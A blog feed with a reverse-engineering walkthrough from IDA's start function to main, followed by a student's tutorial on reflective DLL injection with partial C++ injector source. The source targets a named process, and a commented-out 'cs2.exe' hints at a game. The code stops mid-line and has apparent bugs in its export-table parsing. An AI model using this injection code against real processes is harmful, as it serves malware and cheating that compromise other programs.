class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_140011E30</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    road1();</span><br><span class="line">    <span class="keyword">return</span> road2();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>这两个函数原本不叫这个，是我将其随意命名的，他在你的ida中可能会叫sub_地址，是ida给这个函数起的名字，选择road2点进去</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_140011E50</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __int64 v1; <span class="comment">// rcx</span></span><br><span class="line">    <span class="type">char</span> v2; <span class="comment">// [rsp+20h] [rbp-48h]</span></span><br><span class="line">    <span class="type">unsigned</span> __int8 v3; <span class="comment">// [rsp+21h] [rbp-47h]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Code; <span class="comment">// [rsp+28h] [rbp-40h]</span></span><br><span class="line">    <span class="type">void</span> (__fastcall **v5)(_QWORD, __int64, _QWORD); <span class="comment">// [rsp+30h] [rbp-38h]</span></span><br><span class="line">    _tls_callback_type *v6; <span class="comment">// [rsp+38h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="type">unsigned</span> __int8)sub_140011393(<span class="number">1</span>i64) )</span><br><span class="line">        sub_140011311(<span class="number">7</span>i64);</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    v3 = sub_140011325();</span><br><span class="line">    <span class="keyword">if</span> ( dword_14001D1F8 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        sub_140011311(<span class="number">7</span>i64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( dword_14001D1F8 )</span><br><span class="line">    &#123;</span><br><span class="line">        v2 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        dword_14001D1F8 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( j__initterm_e((_PIFV *)&amp;First, (_PIFV *)&amp;Last) )</span><br><span class="line">            <span class="keyword">return</span> <span class="number">255</span>i64;</span><br><span class="line">        j__initterm((_PVFV *)&amp;qword_14001A000, (_PVFV *)&amp;qword_14001A220);</span><br><span class="line">        dword_14001D1F8 = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_1400112FD(v3);</span><br><span class="line">    v5 = (<span class="type">void</span> (__fastcall **)(_QWORD, __int64, _QWORD))sub_140011299();</span><br><span class="line">    <span class="keyword">if</span> ( *v5 &amp;&amp; (<span class="type">unsigned</span> __int8)sub_14001114F(v5) )</span><br><span class="line">        (*v5)(<span class="number">0</span>i64, <span class="number">2</span>i64, <span class="number">0</span>i64);</span><br><span class="line">    v6 = (_tls_callback_type *)sub_1400112CB();</span><br><span class="line">    <span class="keyword">if</span> ( *v6 &amp;&amp; (<span class="type">unsigned</span> __int8)sub_14001114F(v6) )</span><br><span class="line">        j__register_thread_local_exe_atexit_callback(*v6);</span><br><span class="line">    Code = sub_1400120A0();</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="type">unsigned</span> __int8)sub_140011276() )</span><br><span class="line">        j_exit(Code);</span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line">        j__cexit();</span><br><span class="line">    LOBYTE(v1) = <span class="number">1</span>;</span><br><span class="line">    sub_140011140(v1, <span class="number">0</span>i64);</span><br><span class="line">    <span class="keyword">return</span> Code;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到最后return Code了吗，记得一个main函数的基本框架有return 0吗，当时说0是返回值，返回程序是否正确运行，那么如果想要返回值0，返回到start那里，这一步返回的Code里面的值就应该是return的0，我们要去看Code在这个程序里那里被定义了——sub_1400120A0，在37行，所以说这个函数往里延伸的就是main函数，点进去</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_1400120A0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+20h] [rbp-28h]</span></span><br><span class="line">  <span class="type">char</span> **initial_narrow_environment; <span class="comment">// [rsp+28h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> **v3; <span class="comment">// [rsp+30h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  initial_narrow_environment = j__get_initial_narrow_environment();</span><br><span class="line">  v3 = *j___p___argv();</span><br><span class="line">  v1 = *j___p___argc();</span><br><span class="line">  <span class="keyword">return</span> sub_14001126C(v1, v3, initial_narrow_environment);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还是刚刚的原理，return返回的要是main里面返回的0，所以点开return后跟着的函数，一路到底</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_14001136B(&amp;unk_140022008);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hallo re&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>获得了主函数，如果到这里不是很明白的话，从最后一段代码的return 0，回到最初的start，观察一下，0是不是一直作为返回值被返回</code></pre><h2 id="终"><a href="#终" class="headerlink" title="终"></a>终</h2><p>逆向就是这样，总会有很多东西混淆你，谨记自己的初心，静下来，慢慢观察，最终你也可以从空白的的<strong>start</strong>抵达目标<strong>main</strong></p>]]></content>
      
      
      <categories>
          
          <category> 逆向行驶 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Dll反射型注入</title>
      <link href="/2025/03/26/DLL%E5%8F%8D%E5%B0%84%E6%B3%A8%E5%85%A5blog%E7%AE%80%E6%B4%81%E7%89%88/"/>
      <url>/2025/03/26/DLL%E5%8F%8D%E5%B0%84%E6%B3%A8%E5%85%A5blog%E7%AE%80%E6%B4%81%E7%89%88/</url>
      
        <content type="html"><![CDATA[<p>本篇文章为新生小白学习PE文件之后进行练习所写，肯定会有很多不足之处，欢迎大师傅们点出</p><span id="more"></span><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="普通注入"><a href="#普通注入" class="headerlink" title="普通注入"></a>普通注入</h2><p>先看普通型的注入，如下：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/48016109/1733745869825-09205f80-1fd5-4e45-a2b6-8aec8084c310.png?x-oss-process=image/format,webp/resize,w_1148,limit_0" loading="lazy"></p><p>普通的dll注入是在目标进程中开辟一处空间，在空间中写入dll文件的名称，再用<code>LoadLibraryA</code>函数通过查找名称来加载dll，而想在程序里调用<code>LoadLibraryA</code>的话就得用到<code>CreateRemoteThread</code>函数，这个函数传递的参数之一就有函数指针，等到<code>CreateRemoteThread</code>创建新线程之后，就会在新线程中调用这个过度函数，其二的参数就是传给指针的参数</p><p>这里插一句，在我多次用x64dbg调试得到的感悟，<code>CreateRemoteThread</code>这个函数，相当于开辟了一个不知道在哪的空间，在这个地方引用你要传入的函数</p><h2 id="反射型注入"><a href="#反射型注入" class="headerlink" title="反射型注入"></a>反射型注入</h2><p>反射型dll注入则是将整个DLL文件传到目标进程的空间中，然后通过<code>CreateRemoteThread</code>调用一段shellcode，将DLL展开，并运行</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/48016109/1733920976087-005d55d6-62c4-488b-aebd-78e80b42a7bc.png" loading="lazy"></p><h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><h2 id="Injectmain"><a href="#Injectmain" class="headerlink" title="Injectmain"></a>Injectmain</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">RVAtoFileOffset</span><span class="params">(DWORD rva, PIMAGE_NT_HEADERS pNtHeaders, PIMAGE_SECTION_HEADER pSec)</span></span>;</span><br><span class="line"><span class="function">LPVOID <span class="title">GetRemoteReflectLoad</span><span class="params">(LPVOID pDll, <span class="type">const</span> <span class="type">char</span>* funcName, <span class="type">unsigned</span> <span class="type">char</span>* pBuf)</span></span>;</span><br><span class="line"><span class="function">DWORD <span class="title">ProcesstoPid</span><span class="params">(<span class="type">wchar_t</span>* Processname)</span></span>;</span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">MainInject</span><span class="params">(DWORD dwTargetPid, <span class="type">char</span>* Dllname)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//先定义需要注入的dll与目标进程的名字</span></span><br><span class="line"><span class="comment">//wchar_t szProcName[MAX_PATH] = L&quot;cs2.exe&quot;;</span></span><br><span class="line"><span class="type">wchar_t</span> szProcName[MAX_PATH] = <span class="string">L&quot;pta.exe&quot;</span>;</span><br><span class="line"><span class="type">char</span> Dllname[MAX_PATH] = <span class="string">&quot;D:\\study\\VStudio\\ReflectDll\\x64\\Debug\\DLLIN.dll&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//查找获得目标进程的id</span></span><br><span class="line">DWORD dwPid = <span class="built_in">ProcesstoPid</span>(szProcName);</span><br><span class="line"><span class="comment">//写入dll文件,这里思考一下，传入的参数都是什么呢？</span></span><br><span class="line"><span class="comment">//因为在这个函数里，我们要做的是将dll文件写入，并且用其中的函数</span></span><br><span class="line"><span class="comment">//dll中的API将会作为参数出现，所以传入的是进程id和dll函数目录</span></span><br><span class="line">DWORD result = <span class="built_in">MainInject</span>(dwPid, Dllname);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">ProcesstoPid</span><span class="params">(<span class="type">wchar_t</span>* Processname)</span> <span class="comment">//查找指定进程的PID(Process ID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hProcessSnap = <span class="literal">NULL</span>;</span><br><span class="line">DWORD ProcessId = <span class="number">0</span>;</span><br><span class="line">PROCESSENTRY32 pe32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">hProcessSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>); <span class="comment">//打开进程快照</span></span><br><span class="line"><span class="keyword">if</span> (hProcessSnap == (HANDLE)<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[-] CreateToolhelp32Snapshot() Error: %d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">pe<span class="number">32.</span>dwSize = <span class="built_in">sizeof</span>(PROCESSENTRY32);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Process32First</span>(hProcessSnap, &amp;pe32)) <span class="comment">//开始枚举进程</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">wcscmp</span>(Processname, pe<span class="number">32.</span>szExeFile)) <span class="comment">//判断是否和提供的进程名相等，是，返回进程的ID</span></span><br><span class="line">&#123;</span><br><span class="line">ProcessId = pe<span class="number">32.</span>th32ProcessID;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hProcessSnap, &amp;pe32)); <span class="comment">//继续枚举进程</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[-] Process32First() Error: %d&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!ProcessId) <span class="built_in">printf</span>(<span class="string">&quot;no find&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;[+] target id is %d&quot;</span>, ProcessId);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcessSnap); <span class="comment">//关闭系统进程快照的句柄</span></span><br><span class="line"><span class="keyword">return</span> ProcessId;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//用于转换RVA-&gt;文件偏移地址</span></span><br><span class="line"><span class="comment">//传参说明：第一个是要转换的相对虚拟地址，第二个是Nt头的位置，第三个是节区表头的位置</span></span><br><span class="line"><span class="function">DWORD <span class="title">RVAtoFileOffset</span><span class="params">(DWORD rva, PIMAGE_NT_HEADERS pNtHeaders, PIMAGE_SECTION_HEADER pSec)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 遍历节区表</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pNtHeaders-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line"><span class="comment">// 检查RVA是否在当前节区的范围内</span></span><br><span class="line"><span class="keyword">if</span> (rva &gt;= pSec[i].VirtualAddress &amp;&amp; rva &lt; pSec[i].VirtualAddress + pSec[i].SizeOfRawData) &#123;</span><br><span class="line"><span class="comment">// 转换RVA到文件偏移地址</span></span><br><span class="line"><span class="keyword">return</span> pSec[i].PointerToRawData + (rva - pSec[i].VirtualAddress);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果未找到对应的节区，返回无效值</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//该函数通过分析PE文件头来尝试获取句柄</span></span><br><span class="line"><span class="function">LPVOID <span class="title">GetRemoteReflectLoad</span><span class="params">(LPVOID pDll, <span class="type">const</span> <span class="type">char</span>* funcName, <span class="type">unsigned</span> <span class="type">char</span>* pBuf)</span> </span>&#123;</span><br><span class="line"><span class="comment">//这里因为dll在别的进程里，所以想要看到可以利用前面的pBuf</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定位一些相关文件头</span></span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuf;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pBuf + pDosHeader-&gt;e_lfanew);</span><br><span class="line">PIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)((LPBYTE)pNtHeaders + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS));</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取导出表地址及大小，注意这里是RVA</span></span><br><span class="line">DWORD exportDirRVA = pNtHeaders-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress;</span><br><span class="line">DWORD exportDirSize = pNtHeaders-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].Size;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定位导出表</span></span><br><span class="line"><span class="comment">//这里遇到一个小问题，得到的偏移地址是RVA，但是咱们的文件现在只是磁盘文件,所以需要转换</span></span><br><span class="line">DWORD exportDirFileOffset = <span class="built_in">RVAtoFileOffset</span>((DWORD)exportDirRVA, pNtHeaders, pSec);</span><br><span class="line"></span><br><span class="line"><span class="comment">//转换之后RVA就变成了文件偏移，然后再定位</span></span><br><span class="line">PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)pBuf + exportDirFileOffset);</span><br><span class="line"></span><br><span class="line"><span class="comment">//解析导出表，这里同理都是RVA</span></span><br><span class="line">DWORD pRNames = pExportDir-&gt;AddressOfNames;</span><br><span class="line">DWORD pFNames = <span class="built_in">RVAtoFileOffset</span>(pRNames, pNtHeaders, pSec);</span><br><span class="line">DWORD* pNames = (DWORD*)((BYTE*)pBuf + pFNames);</span><br><span class="line"></span><br><span class="line">DWORD pRFunctions = pExportDir-&gt;AddressOfFunctions;</span><br><span class="line">DWORD pFFunctions = <span class="built_in">RVAtoFileOffset</span>(pRFunctions, pNtHeaders, pSec);</span><br><span class="line">DWORD* pFunctions = (DWORD*)((BYTE*)pBuf + pFFunctions);</span><br><span class="line"></span><br><span class="line">WORD pRNameOrdinals = pExportDir-&gt;AddressOfNameOrdinals;</span><br><span class="line">WORD pFNameOrdinals = <span class="built_in">RVAtoFileOffset</span>(pRNameOrdinals, pNtHeaders, pSec);</span><br><span class="line">WORD* pNameOrdinals = (WORD*)((BYTE*)pBuf + pFFunctions);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历查找目标函数</span></span><br><span class="line">DWORD funcRVA = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; pExportDir-&gt;NumberOfNames; i++) &#123;</span><br><span class="line">DWORD functionNameRVA = pNames[i];</span><br><span class="line">DWORD functionNameFileOffset = <span class="built_in">RVAtoFileOffset</span>(functionNameRVA, pNtHeaders, pSec);</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* pName = (<span class="type">char</span>*)((BYTE*)pBuf + functionNameFileOffset);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(pName, funcName) == <span class="number">0</span>) &#123;</span><br><span class="line">funcRVA = pFunctions[i];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (funcRVA == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[-] Function %s not found.&quot;</span>, funcName);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD fileOffset = <span class="built_in">RVAtoFileOffset</span>(funcRVA, pNtHeaders, pSec);;</span><br><span class="line">DWORD* pfileOffset = (DWORD*)((BYTE*)pBuf + fileOffset);</span><br><span class="line"><span class="keyword">if</span> (fileOffset == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[-] Failed to convert RVA to file offset.&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LPVOID remoteFuncAddr = (LPBYTE)pDll + fileOffset;</span><br><span class="line"><span class="keyword">return</span> remoteFuncAddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">MainInject</span><span class="params">(DWORD dwTargetPid, <span class="type">char</span>* Dllname)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//与普通dll注入一样，首先要做的是获取句柄</span></span><br><span class="line">HANDLE hProc = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">hProc = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwTargetPid);</span><br><span class="line"><span class="keyword">if</span> (!hProc)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[-] OpenProcess Failed.&quot;</span>);</span><br><span class="line">DWORD dwError = <span class="built_in">GetLastError</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[-] OpenProcess failed. Error code: %d\n&quot;</span>, dwError);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//有了句柄就可以创建空间然后写入了，这里的写入我参考的是PE加载器中</span></span><br><span class="line"><span class="comment">//ReadFileA与创建空间的方法，其中相当于是在目标进程空间中创造一个&quot;类磁盘&quot;空间</span></span><br><span class="line"></span><br><span class="line">HANDLE hFile = <span class="built_in">CreateFileA</span>(Dllname,</span><br><span class="line">GENERIC_READ,     <span class="comment">//读取权限</span></span><br><span class="line">FILE_SHARE_READ | FILE_SHARE_WRITE,     <span class="comment">//允许其他进程读取文件|允许其他进程写入文件</span></span><br><span class="line"><span class="literal">NULL</span>,    <span class="comment">//不需要特定的安全性</span></span><br><span class="line">OPEN_EXISTING,     <span class="comment">//不需要特定的安全性</span></span><br><span class="line">FILE_ATTRIBUTE_NORMAL,    <span class="comment">//如果文件存在，则打开文件。如果文件不存在，操作会失败</span></span><br><span class="line"><span class="literal">NULL</span>    <span class="comment">//普通文件，没有特殊属性。</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[-] CreateFileA failed.&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD FileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line">LPDWORD SizeToRead = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//本地暂存</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* pBuf = <span class="keyword">new</span> <span class="type">unsigned</span> <span class="type">char</span>[FileSize];</span><br><span 